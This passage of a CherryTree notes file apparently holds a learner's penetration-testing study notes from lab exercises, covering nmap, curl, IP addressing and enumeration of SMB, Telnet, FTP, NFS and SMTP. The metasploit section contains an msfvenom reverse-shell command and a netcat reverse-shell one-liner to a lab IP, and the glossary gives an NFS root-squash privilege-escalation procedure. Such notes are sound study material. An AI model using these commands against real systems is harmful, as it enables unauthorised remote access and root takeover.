					<codebox char_offset="315" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap --script=vuln 127.0.0.1</codebox>
					<codebox char_offset="340" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">namp --script=smb-enum-users, smb-enum-shares #commas for multiple</codebox>
					<codebox char_offset="375" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap --script http-get --script-args http-get.arg1, http-put.arg2 </codebox>
					<codebox char_offset="1566" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap -sU --top-ports 20 &lt;target&gt; #scans top 20 UDP ports</codebox>
					<codebox char_offset="2074" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap -Pn 127.0.0.1</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614887548.47" ts_lastsave="1614974389.67" unique_id="9">
					<rich_text>• misc</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="misc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614898147.65" ts_lastsave="1615060566.42" unique_id="19">
						<rich_text scale="h3">• </rich_text>
						<rich_text background="#00000000ffff" scale="h3">msfvenom</rich_text>
						<rich_text scale="h3"> - payload and encoder generator</rich_text>
						<rich_text>
   ◇ </rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>
   ◇ previous example generates </rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>
   ◇ this was pasted into back door in a telnet service to establish reverse shell on local port 4444

</rich_text>
						<rich_text background="#ffff00000000" scale="h2">Core Commands</rich_text>
						<rich_text>
• </rich_text>
						<codebox char_offset="48" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">msfvenom -p cmd/unix/reverse_netcat lhost=10.9.5.144 lport=4444 R</codebox>
						<codebox char_offset="82" frame_height="40" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">mkfifo /tmp/kgkioku; nc 10.9.5.144 4444 0&lt;/tmp/kgkioku | /bin/sh &gt;/tmp/kgkioku 2&gt;&amp;1; rm /tmp/kgkioku</codebox>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614974389.67" ts_lastsave="1615061452.63" unique_id="21">
						<rich_text background="#ffff00000000" link="node 13" scale="h3">SMTP</rich_text>
						<rich_text scale="h3"> </rich_text>
						<rich_text background="#ffff00000000" scale="h3">modules</rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>
• smtp_enum
• smtp_version</rich_text>
						<encoded_png anchor="smtp" char_offset="12">anchor</encoded_png>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="curl" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1615579534.1" ts_lastsave="1615580118.7" unique_id="22">
					<rich_text scale="h1">Make http requests and interact with cookies on the command line with this handy tool</rich_text>
					<rich_text>



• save cookies to a specific file
   ◇ 

• set and send cookie
   ◇ 

• send post request with body
   ◇ </rich_text>
					<codebox char_offset="87" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">curl 127.0.0.1 #default request is GET on default port 80</codebox>
					<codebox char_offset="129" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">curl -c $(pwd)/cookies.txt 10.10.168.165:8081/ctf/getcookie</codebox>
					<codebox char_offset="159" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">curl --cookie &quot;flagpls=flagpls&quot; 10.10.168.165:8081/ctf/sendcookie</codebox>
					<codebox char_offset="197" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">curl -d &quot;flag_please&quot; -X POST 10.10.168.165:8081/ctf/post</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Burp Suite" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1615580672.72" ts_lastsave="1615580672.72" unique_id="23">
					<rich_text></rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="IP address/Notation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614373157.21" ts_lastsave="1614915280.38" unique_id="14">
				<rich_text>• </rich_text>
				<rich_text background="#00000000ffff">IPv4</rich_text>
				<rich_text>, most common at the moment\
   ◇ 32 bit (or 4 byte) address divided into 4 8 bit segments (1 byte)
   ◇ each segment, octet, value ranges 0-255
• </rich_text>
				<rich_text background="#00000000ffff">IPv6</rich_text>
				<rich_text>, newest
   ◇ 128 bit address
   ◇ expressed in hexadecimal

</rich_text>
				<rich_text background="#ffff00000000" scale="h2">Classes</rich_text>
				<rich_text>
</rich_text>
				<rich_text scale="h3">• </rich_text>
				<rich_text background="#00000000ffff" scale="h3">Class A</rich_text>
				<rich_text scale="h3">: 0.0.0.0 - 127.255.255.255</rich_text>
				<rich_text>
   ◇ Network: first octet
</rich_text>
				<rich_text scale="h3">• </rich_text>
				<rich_text background="#00000000ffff" scale="h3">Class B:</rich_text>
				<rich_text scale="h3"> 128.0.0.0 - 191.255.255.255</rich_text>
				<rich_text>
   ◇ Network: first two ocetets
</rich_text>
				<rich_text scale="h3">• </rich_text>
				<rich_text background="#00000000ffff" scale="h3">Class C</rich_text>
				<rich_text scale="h3">: 192.0.0.0 - 223.255.255.255</rich_text>
				<rich_text>
   ◇ Network: first three

</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>

</rich_text>
				<rich_text background="#ffff00000000" scale="h3">Netmask/Subnets</rich_text>
				<rich_text>
• dividing network into smaller networks
• netmask determines number of bits dedicated to describe network portion ex:
   255.255.255.0 (1111 1111 - 1111 1111 - 1111 1111 - 0000 0000) or /24 has one subnet thus range of hosts on the one subnet is 192.168.4.0-255</rich_text>
				<encoded_png char_offset="426"></encoded_png>
				<encoded_png char_offset="427"></encoded_png>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Glossary" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614733772.93" ts_lastsave="1615061095.71" unique_id="15">
			<rich_text scale="h3">• </rich_text>
			<rich_text background="#00000000ffff" scale="h3">Port</rich_text>
			<rich_text scale="h3"> - logical construct that identifies process or network service, necessary for running multple network requests or services.</rich_text>
			<rich_text>
   ◇ 65535 ports total; 0-1023 are well-known (for widely used network services like http)
   ◇ scan all ports nmap with -p- flag

</rich_text>
			<rich_text scale="h3">• </rich_text>
			<rich_text justification="left" scale="h3"></rich_text>
			<rich_text background="#00000000ffff" scale="h3">Root Squashing</rich_text>
			<rich_text scale="h3"> - </rich_text>
			<rich_text>NFS share feature if enabled prevents remote users from having root access to NFS volume. If not enabled it is possible to gain root access via SUID bit files.
   ◇ check if enabled by creating file as root within mounted NFS share and check owner, if root then no_root_squash if nobody/nogroup then disabled
   1) copy /bin/bash that would work on victim machine
   2) change owner and (set uid and execute )permissions </rich_text>
			<rich_text link="node 3 perm">see</rich_text>
			<rich_text>
   4) login ssh
   5) execute bash with -p flag to gain root
      ▪ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>

</rich_text>
			<rich_text scale="h3">• </rich_text>
			<rich_text background="#00000000ffff" scale="h3">POP/IMAP</rich_text>
			<rich_text scale="h3"> - see </rich_text>
			<rich_text link="node 13" scale="h3">SMTP</rich_text>
			<rich_text>
</rich_text>
			<rich_text scale="h3">• </rich_text>
			<rich_text background="#00000000ffff" scale="h3">Module</rich_text>
			<rich_text scale="h3"> (</rich_text>
			<rich_text link="node 9" scale="h3">metasploit</rich_text>
			<rich_text scale="h3">) - piece of software that perfoms task such as perfomring exploit</rich_text>
			<encoded_png anchor="root_squash" char_offset="264">anchor</encoded_png>
			<codebox char_offset="776" frame_height="20" frame_width="525" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">./bash -p #root</codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Common/Popular services" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614733857.53" ts_lastsave="1614972471.38" unique_id="18">
			<rich_text>• </rich_text>
			<rich_text link="node 16">SMB</rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="node 17">Telnet</rich_text>
			<rich_text>
• FTP
• NFS
• SMTP</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="SMB" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614642260.63" ts_lastsave="1614737337.97" unique_id="16">
				<rich_text background="#00000000ffff" scale="h1">Samba open-source alternative for Unix systems</rich_text>
				<rich_text>

Server Message Block allows to share resources (printers and file systems) on the network.
• clients connect via TCP/IP (or NetBios)

Related
• tool: </rich_text>
				<rich_text link="node 11 enum">enum4linux</rich_text>
				<rich_text> search for anonymous login, enumeration
• tool: </rich_text>
				<rich_text link="node 11 smbclient">smbclient</rich_text>
				<rich_text>, interact with SMB server for linux</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Telnet" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614716686.31" ts_lastsave="1614915312.88" unique_id="17">
				<rich_text background="#00000000ffff" scale="h1">Telnet is application protocol that allows remote access, commands/instructions are sent over plaintext</rich_text>
				<rich_text>

</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>

</rich_text>
				<rich_text background="#ffff00000000" scale="h3">look for Anonymous login</rich_text>
				<rich_text>

Related
• enumerate: </rich_text>
				<rich_text link="node 12">nmap</rich_text>
				<rich_text> port scan</rich_text>
				<codebox char_offset="105" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">telnet 127.0.0.1 8012 #telnet connect on port 8012</codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="FTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614888045.14" ts_lastsave="1614916435.16" unique_id="10">
				<rich_text background="#00000000ffff" scale="h1">Allows remote transfer of files between client and server</rich_text>
				<rich_text>

• FTP is not secure, traffic is sent in plain text

1. FTP session composed of two channels
• command
   ◇ transfers FTP commands/replies
• data
   ◇ transfers data

FTP Session
Client connects to FTP port on server (command channel; common port 21) then [depends on </rich_text>
				<rich_text background="#00000000ffff">passive/active</rich_text>
				<rich_text>]

2. </rich_text>
				<rich_text background="#00000000ffff">Passive</rich_text>
				<rich_text> and/or </rich_text>
				<rich_text background="#00000000ffff">Active</rich_text>
				<rich_text> session
• Active, client determines client-side port for data channel
• Passive, server determines server-side port for data channel

</rich_text>
				<rich_text background="#ffff00000000" scale="h3">look for Anonymous login</rich_text>
				<rich_text>

Relevant
• </rich_text>
				<rich_text link="node 12">Nmap</rich_text>
				<rich_text> for enumeration
• NFS-Common</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="NFS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614915804.86" ts_lastsave="1614974518.26" unique_id="20">
				<rich_text background="#00000000ffff" scale="h3">Access files and directories on remote system as if it was local. Share files across different machines and platoforms like Windows → Linux and vice versa </rich_text>
				<rich_text>

1. client requests to mount directory from remote server
2. server checks client's permissions based on four parameters
   1) file handle
   2) name of file to be accessed
   3) user's user id
   4) user's group id

Relevant
• enum: consider </rich_text>
				<rich_text link="node 12">Nmap</rich_text>
				<rich_text> port scan with -A and -p- flags
• see these </rich_text>
				<rich_text link="node 3 nfs">commands</rich_text>
				<rich_text> need </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
• Privilege secalation via </rich_text>
				<rich_text link="node 15 root_squash">root squashing</rich_text>
				<codebox char_offset="462" frame_height="20" frame_width="400" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo apt install nfs-common #comes installed Kali</codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="SMTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614972471.38" ts_lastsave="1614974797.57" unique_id="13">
				<rich_text background="#00000000ffff" scale="h1">Protocol pair SMTP and POP/IMAP are used to send and receive email</rich_text>
				<rich_text>

</rich_text>
				<rich_text background="#ffff00000000" scale="h3">SImple Mail Transfer Protocol</rich_text>
				<rich_text>
• verifies who is sending emails
• send outgoing mail
• returns mail to sender if can't be delivered

</rich_text>
				<rich_text background="#ffff00000000" scale="h3">POP/IMAP (Post Office Protocol, Internet Message Access Protocol)</rich_text>
				<rich_text>
• POP - downloads inbox from mail server
• IMAP - synchronizes inbox with mail server, downloading anything new automatically, changes made to one inbox perists across others.

• Linux and Windows can run SMTP servers
• common port 25

Relevant
• enumerate with: </rich_text>
				<rich_text link="node 12">Nmap</rich_text>
				<rich_text>, metasploit smtp_version, smtp_enum modules,  
• SMTP services commands on SMTP server:
   ◇ enumerate valid users </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text> 
   ◇ enumerate email addresses and aliases </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
   ◇ use these manually or with metasploit smtp_enum
• smtp-user-enum: enum os level user accounts on Solaris machines </rich_text>
				<codebox char_offset="649" frame_height="20" frame_width="50" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">VRFY</codebox>
				<codebox char_offset="695" frame_height="20" frame_width="50" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">EXPN</codebox>
			</node>
		</node>
	</node>
</cherrytree>
